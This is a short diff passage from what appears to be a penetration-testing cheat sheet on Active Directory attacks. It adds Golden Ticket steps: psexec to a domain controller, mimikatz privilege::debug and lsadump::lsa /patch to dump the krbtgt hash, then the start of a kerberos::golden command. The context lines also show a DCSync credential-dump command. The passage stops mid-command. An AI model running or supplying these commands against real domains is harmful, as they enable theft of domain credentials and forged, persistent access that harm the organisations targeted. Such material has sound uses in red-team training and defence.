@@ -162,6 +162,15 @@ Does NOT need localadmin to run, just DC Replication privs:
 lsadump::dcsync /user:Bob
 ```
 #### Golden
+Jump to DC to dump krbtgt hash -
+
+```psexec.exe \\dc01 cmd.exe```
+
+```Privilege::debug```
+
+```lsadump::lsa /patch```
+
+Now back on attacker machine you use the NTLM of krbtgt account to create Golden Tickets:-
 
 ```
 kerberos::golden 
